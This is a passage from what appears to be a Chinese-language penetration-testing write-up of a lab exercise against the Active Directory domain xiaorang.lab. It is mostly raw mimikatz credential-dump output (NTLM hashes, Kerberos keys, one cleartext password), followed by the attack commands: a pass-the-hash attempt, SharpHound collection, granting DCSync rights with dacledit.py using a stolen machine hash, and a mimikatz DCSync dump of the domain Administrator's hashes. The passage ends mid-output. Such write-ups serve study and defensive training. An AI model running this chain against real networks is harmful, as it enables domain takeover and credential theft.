[00000003] Primary</span><br><span class="line">     * Username : Zhangtong</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line">     * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line">     * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : Zhangtong</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : Zhangtong</span><br><span class="line">     * Domain   : XIAORANG.LAB</span><br><span class="line">     * Password : (null)</span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 63573 (00000000:0000f855)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 21:44:08</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 46c981f71101f966f05c247c73483379</span><br><span class="line">     * SHA1     : 3c091d00f75daa08bf846636924b3e11977b38d3</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : xiaorang.lab</span><br><span class="line">     * Password : f7 78 46 cb 83 85 97 87 68 d8 37 f9 7b d6 85 40 0e 2b 12 2f f3 ba 19 dc f2 6f 3f 45 ff e5 77 bb e9 32 24 95 4f 8d 27 85 83 32 24 f3 23 48 16 ad fc 61 4a 4e 83 61 0f 0b 17 5c eb 82 d6 27 de 64 59 96 0a f3 e0 85 3a a8 d5 b7 3e c1 cc da 4d ed d2 1c 13 26 2a cd 48 f4 34 64 64 5d ed a4 b5 19 0d 3e 62 4b 09 71 73 11 90 ce 4a 69 37 de 53 85 e1 9c be b2 14 33 67 01 9e f8 f3 bc 92 ce 1b b5 40 16 ab b8 a7 f6 7b 32 0a 17 22 71 a4 22 25 c1 f9 84 66 dc fd b9 4f b7 5d 2d d2 6e 23 58 54 c2 55 78 cc 64 8e a3 48 65 f2 dd e5 bf 76 49 c6 7a 1f b2 6a 09 ec 40 c1 a3 83 11 0a 10 12 f8 8f d7 ee ee 8b 81 04 4f b3 5a 6c 63 6a 49 76 71 0a 58 5c 31 f2 2d 97 2d be 8e 84 22 ae 29 10 3a 63 66 17 7d cb 3b 17 7c 4f 8a ff d1 db b0 1e 82 64 e6 </span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 10511454 (00000000:00a0645e)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2023/10/19 22:25:26</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : HealthMailbox0d5918e</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 24ede8bf5898e43b56afa207ee5b42d2</span><br><span class="line">     * SHA1     : 5fa54554e61298d10a8aab3565d17cb17d84fb5a</span><br><span class="line">     * DPAPI    : d3eae48eca56207938fc8ef39add245a</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : HealthMailbox0d5918e</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : HealthMailbox0d5918e</span><br><span class="line">     * Domain   : XIAORANG.LAB</span><br><span class="line">     * Password : (null)</span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 2328428 (00000000:0023876c)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 21:46:18</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 46c981f71101f966f05c247c73483379</span><br><span class="line">     * SHA1     : 3c091d00f75daa08bf846636924b3e11977b38d3</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : xiaorang.lab</span><br><span class="line">     * Password : f7 78 46 cb 83 85 97 87 68 d8 37 f9 7b d6 85 40 0e 2b 12 2f f3 ba 19 dc f2 6f 3f 45 ff e5 77 bb e9 32 24 95 4f 8d 27 85 83 32 24 f3 23 48 16 ad fc 61 4a 4e 83 61 0f 0b 17 5c eb 82 d6 27 de 64 59 96 0a f3 e0 85 3a a8 d5 b7 3e c1 cc da 4d ed d2 1c 13 26 2a cd 48 f4 34 64 64 5d ed a4 b5 19 0d 3e 62 4b 09 71 73 11 90 ce 4a 69 37 de 53 85 e1 9c be b2 14 33 67 01 9e f8 f3 bc 92 ce 1b b5 40 16 ab b8 a7 f6 7b 32 0a 17 22 71 a4 22 25 c1 f9 84 66 dc fd b9 4f b7 5d 2d d2 6e 23 58 54 c2 55 78 cc 64 8e a3 48 65 f2 dd e5 bf 76 49 c6 7a 1f b2 6a 09 ec 40 c1 a3 83 11 0a 10 12 f8 8f d7 ee ee 8b 81 04 4f b3 5a 6c 63 6a 49 76 71 0a 58 5c 31 f2 2d 97 2d be 8e 84 22 ae 29 10 3a 63 66 17 7d cb 3b 17 7c 4f 8a ff d1 db b0 1e 82 64 e6 </span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 21:44:10</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">    msv :    </span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : (null)</span><br><span class="line">     * Domain   : (null)</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 63606 (00000000:0000f876)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 21:44:08</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 9587463cfa3fd1ea760c401e2c52e224</span><br><span class="line">     * SHA1     : 162fc915ffccfa73c6f53b3c92f02690ccf7831c</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : xiaorang.lab</span><br><span class="line">     * Password : 12 ae e6 f2 22 80 c0 a3 cd 84 c9 94 de ef 96 52 79 ff ea 99 f6 9c 67 48 10 08 e7 99 1a fa 51 11 ad b6 c1 79 cc 6d 04 b2 22 01 47 b0 53 b5 7e ff df 04 21 34 ae 7b ee c9 cf b1 c1 d3 c0 63 d3 d7 6a f2 3a 38 83 ac cf d2 93 7b d3 0b bb d6 a5 8d 7c cd f1 77 65 0b 8c 77 dd 98 49 3c 21 f0 5d fc a7 8f c7 e0 5b f7 96 4d d2 46 14 81 8f 4f a7 a4 27 11 09 03 f9 f4 0d ce 71 4d 8d 64 c3 a9 6b 5c 4a 77 ba ac 33 1a 49 60 11 bd 4d b2 1e 98 05 1a c1 03 5b c6 cf 4e 1c d3 83 10 52 51 68 c4 b1 e0 65 c2 36 f3 a6 3f 66 c6 95 8c 3d 47 ab 9b cb 35 bd 53 f0 6f 13 ae 48 28 5e cf 5b ee 45 ce 7f 10 47 aa e6 f0 d3 09 c0 b3 ad ef 24 00 c5 c8 f0 7f a5 06 93 0e f5 a4 2a ec d0 25 96 4d a4 88 d3 55 94 d9 94 81 ef 8b ba 9e 89 b6 36 dc 88 64 8d 96 </span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 22399 (00000000:0000577f)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 21:43:58</span><br><span class="line">SID               : </span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 46c981f71101f966f05c247c73483379</span><br><span class="line">     * SHA1     : 3c091d00f75daa08bf846636924b3e11977b38d3</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">    kerberos :    </span><br><span class="line">    ssp :    </span><br><span class="line">     [00000000]</span><br><span class="line">     * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab</span><br><span class="line">     * Domain   : (null)</span><br><span class="line">     * Password : &amp;k$@DY98tIt&gt;P.Ydx2!Xl=h(2XWQB&#125;wu9]Xi3RZ=hQyV&#123;0iSp-9?EmAxZf&#123;GY&#125;Dx0cpEv&#123;kGj5OUjq&#125;x(v!_Y_*Ke0kg&amp;&#123;|32&#125;r15W2Lq&#125;oE1H59a-l4N$|55dU#GyyD</span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : XIAORANG-EXC01$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 21:43:58</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">    msv :    </span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : xiaorang-exc01$</span><br><span class="line">     * Domain   : XIAORANG.LAB</span><br><span class="line">     * Password : (null)</span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : XIAORANG-EXC01$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 21:44:08</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 46c981f71101f966f05c247c73483379</span><br><span class="line">     * SHA1     : 3c091d00f75daa08bf846636924b3e11977b38d3</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : xiaorang-exc01$</span><br><span class="line">     * Domain   : XIAORANG.LAB</span><br><span class="line">     * Password : (null)</span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 10115413 (00000000:009a5955)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2023/10/19 22:24:49</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : HealthMailbox0d5918e</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 24ede8bf5898e43b56afa207ee5b42d2</span><br><span class="line">     * SHA1     : 5fa54554e61298d10a8aab3565d17cb17d84fb5a</span><br><span class="line">     * DPAPI    : d3eae48eca56207938fc8ef39add245a</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : HealthMailbox0d5918e</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : HealthMailbox0d5918e</span><br><span class="line">     * Domain   : XIAORANG.LAB</span><br><span class="line">     * Password : (null)</span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 9467606 (00000000:009076d6)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : DefaultAppPool</span><br><span class="line">Domain            : IIS APPPOOL</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 22:11:36</span><br><span class="line">SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 46c981f71101f966f05c247c73483379</span><br><span class="line">     * SHA1     : 3c091d00f75daa08bf846636924b3e11977b38d3</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : xiaorang.lab</span><br><span class="line">     * Password : f7 78 46 cb 83 85 97 87 68 d8 37 f9 7b d6 85 40 0e 2b 12 2f f3 ba 19 dc f2 6f 3f 45 ff e5 77 bb e9 32 24 95 4f 8d 27 85 83 32 24 f3 23 48 16 ad fc 61 4a 4e 83 61 0f 0b 17 5c eb 82 d6 27 de 64 59 96 0a f3 e0 85 3a a8 d5 b7 3e c1 cc da 4d ed d2 1c 13 26 2a cd 48 f4 34 64 64 5d ed a4 b5 19 0d 3e 62 4b 09 71 73 11 90 ce 4a 69 37 de 53 85 e1 9c be b2 14 33 67 01 9e f8 f3 bc 92 ce 1b b5 40 16 ab b8 a7 f6 7b 32 0a 17 22 71 a4 22 25 c1 f9 84 66 dc fd b9 4f b7 5d 2d d2 6e 23 58 54 c2 55 78 cc 64 8e a3 48 65 f2 dd e5 bf 76 49 c6 7a 1f b2 6a 09 ec 40 c1 a3 83 11 0a 10 12 f8 8f d7 ee ee 8b 81 04 4f b3 5a 6c 63 6a 49 76 71 0a 58 5c 31 f2 2d 97 2d be 8e 84 22 ae 29 10 3a 63 66 17 7d cb 3b 17 7c 4f 8a ff d1 db b0 1e 82 64 e6 </span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 2328450 (00000000:00238782)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 21:46:18</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">    msv :    </span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * NTLM     : 46c981f71101f966f05c247c73483379</span><br><span class="line">     * SHA1     : 3c091d00f75daa08bf846636924b3e11977b38d3</span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : XIAORANG</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : XIAORANG-EXC01$</span><br><span class="line">     * Domain   : xiaorang.lab</span><br><span class="line">     * Password : f7 78 46 cb 83 85 97 87 68 d8 37 f9 7b d6 85 40 0e 2b 12 2f f3 ba 19 dc f2 6f 3f 45 ff e5 77 bb e9 32 24 95 4f 8d 27 85 83 32 24 f3 23 48 16 ad fc 61 4a 4e 83 61 0f 0b 17 5c eb 82 d6 27 de 64 59 96 0a f3 e0 85 3a a8 d5 b7 3e c1 cc da 4d ed d2 1c 13 26 2a cd 48 f4 34 64 64 5d ed a4 b5 19 0d 3e 62 4b 09 71 73 11 90 ce 4a 69 37 de 53 85 e1 9c be b2 14 33 67 01 9e f8 f3 bc 92 ce 1b b5 40 16 ab b8 a7 f6 7b 32 0a 17 22 71 a4 22 25 c1 f9 84 66 dc fd b9 4f b7 5d 2d d2 6e 23 58 54 c2 55 78 cc 64 8e a3 48 65 f2 dd e5 bf 76 49 c6 7a 1f b2 6a 09 ec 40 c1 a3 83 11 0a 10 12 f8 8f d7 ee ee 8b 81 04 4f b3 5a 6c 63 6a 49 76 71 0a 58 5c 31 f2 2d 97 2d be 8e 84 22 ae 29 10 3a 63 66 17 7d cb 3b 17 7c 4f 8a ff d1 db b0 1e 82 64 e6 </span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 21:44:08</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">    msv :    </span><br><span class="line">    tspkg :    </span><br><span class="line">    wdigest :    </span><br><span class="line">     * Username : (null)</span><br><span class="line">     * Domain   : (null)</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :    </span><br><span class="line">     * Username : (null)</span><br><span class="line">     * Domain   : (null)</span><br><span class="line">     * Password : (null)</span><br><span class="line">    ssp :    </span><br><span class="line">    credman :    </span><br></pre></td></tr></table></figure><p>信息被我们dump下来了全部。我们可以获取xiaorang用户的NTML HASH，这一步可以进行pth喷洒攻击<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697727779817-176536bc-af5e-48bd-ad6e-8b11fad9a5f7.png#averageHue=%235d616a&clientId=uf64cfa66-87ef-4&from=paste&height=230&id=u881644a4&originHeight=287&originWidth=1467&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=590443&status=done&style=none&taskId=u2a969071-17b7-4208-bb09-914073bf369&title=&width=1173.6" alt="image.png"><br>似乎是因为SMB没开启，不过没关系，这时候就需要用到bloodhound进行一个信息搜集了<br><code>sharphound.exe -c all</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697728295090-ea873228-a3e2-43c9-89cd-f39d1a26ceca.png#averageHue=%23dae2ed&clientId=u3ae68c95-6ba9-4&from=paste&height=92&id=u11c8daff&originHeight=115&originWidth=1004&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15980&status=done&style=none&taskId=u5ccdadbd-647a-460e-a0e3-79be70d1f11&title=&width=803.2" alt="image.png"><br>拿下来导入bloodhound然后进行分析，等待过程是比较慢的，毕竟neo4j嘛。。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697730336510-60741c7a-0a0c-46ec-b924-bd174abb0e2f.png#averageHue=%23eff1f5&clientId=u96fde009-8dee-4&from=paste&id=u7add4d70&originHeight=1790&originWidth=3024&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u1feed8f3-44b4-43ea-a954-e751b4f80c0&title="><br>偷一下XZ的图，妈的我的bloodhound上传json文件卡了，真恶心</p><h2 id="Dsync-Dump"><a href="#Dsync-Dump" class="headerlink" title="Dsync Dump"></a>Dsync Dump</h2><p><a href="https://github.com/CravateRouge/bloodyAD">https://github.com/CravateRouge/bloodyAD</a><br>用到个方便点的工具，方便利用WriteDacl权限去添加dsync权限进而dump hashes<br>既然有writedacl权限，那就可以给域内任意用户添加任意dacl权限了，这里给zhangtong用户添加dsync权限，我们现在的机子是XIAORANG-EXC01，是Exchange组的成员，因此也有writedacl权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697730892411-0c53d3c0-c5b3-463b-81e5-0d091ae28dd3.png#averageHue=%235a5e68&clientId=u96fde009-8dee-4&from=paste&height=366&id=u2603d98f&originHeight=457&originWidth=1466&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=930934&status=done&style=none&taskId=u5dad1fcd-fee9-4264-9296-75873fe87b8&title=&width=1172.8" alt="image.png"><br><code>proxychains dacledit.py xiaorang.lab/XIAORANG-EXC01 -hashes :46c981f71101f966f05c247c73483379 -action write -rights DCSync -principal Zhangtong -target-dn &#39;dc=xiaorang,dc=lab&#39; -dc-ip 172.22.3.2</code><br>但我其实不是这样写的。这一波我觉得其实可以直接给当前机子，也就是自身dsync权限，然后用mimikatz直接dump就行了<br><code> proxychains dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :46c981f71101f966f05c247c73483379 -action write -rights DCSync -principal XIAORANG-EXC01$ -target-dn &#39;dc=xiaorang,dc=lab&#39; -dc-ip 172.22.3.2</code></p><blockquote><p>-hashes 当前机子的hash<br>-action 行为是添加也就是write<br>-principal 目标用户<br>-target-dn 域名<br>dc-ip 域控的ip</p></blockquote><p>域控的ip我们fscan的结果看到了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697730941560-2fde2a5a-45d2-48af-bf51-f5a0f34ead21.png#averageHue=%232b2e37&clientId=u96fde009-8dee-4&from=paste&height=106&id=u7c6ce69d&originHeight=133&originWidth=988&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13253&status=done&style=none&taskId=u172e7e37-5e69-487e-8df1-5e150396bd6&title=&width=790.4" alt="image.png"><br>那么接下来用mimikatz直接dump一下捏<br><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; &gt;5.log</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # </span><br><span class="line">C:\迅雷下载&gt; mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; &gt;5.log</span><br><span class="line">C:\迅雷下载&gt; type 5.log</span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061</span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /user:Administrator</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;XIAORANG-WIN16.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;Administrator&#x27; will be the user account</span><br><span class="line">Object RDN           : Administrator</span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">User Principal Name  : Administrator@xiaorang.lab</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000200 ( NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : 1601/1/1 8:00:00</span><br><span class="line">Password last change : 2023/10/19 21:43:49</span><br><span class="line">Object Security ID   : S-1-5-21-533686307-2117412543-4200729784-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 7acbc09a6c0efd81bfa7d5a1d4238beb</span><br><span class="line">    ntlm- 0: 7acbc09a6c0efd81bfa7d5a1d4238beb</span><br><span class="line">    ntlm- 1: 7acbc09a6c0efd81bfa7d5a1d4238beb</span><br><span class="line">    ntlm- 2: 7acbc09a6c0efd81bfa7d5a1d4238beb</span><br><span class="line">    ntlm- 3: 7acbc09a6c0efd81bfa7d5a1d4238beb</span><br><span class="line">    lm  - 0: f2ec8e584adb61457cfe4f77ea486895</span><br><span class="line">    lm  - 1: 0f3223fca69c1d65a67c729a74e20a42</span><br><span class="line">    lm  - 2: eae2ede2edea9c03fdd0c6e236646d41</span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : e5b0c4a82f7fbf0708b67d701a6aa8b0</span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : XIAORANG.LABAdministrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : d35b5e1dedca8060e674610041c5095c853724ca50c986c909a955b15fadf630</span><br><span class="line">      aes128_hmac       (4096) : 8b17084cfa8d1c1d37c13201d68ec0cf</span><br><span class="line">      des_cbc_md5       (4096) : d9c4a4d5348f0d73</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (4096) : d35b5e1dedca8060e674610041c5095c853724ca50c986c909a955b15fadf630</span><br><span class="line">      aes128_hmac       (4096) : 8b17084cfa8d1c1d37c13201d68ec0cf</span><br><span class="line">      des_cbc_md5       (4096) : d9c4a4d5348f0d73</span><br><span class="line">    OlderCredentials</span><br><span class="line">      aes256_hmac       (4096) : d35b5e1dedca8060e674610041c5095c853724ca50c986c909a955b15fadf630</span><br><span class="line">      aes128_hmac       (4096) : 8b17084cfa8d1c1d37c13201d68ec0cf</span><br><span class="line">      des_cbc_md5       (4096) : d9c4a4d5348f0d73</span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : XIAORANG.LABAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : d9c4a4d5348f0d73</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : d9c4a4d5348f0d73</span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  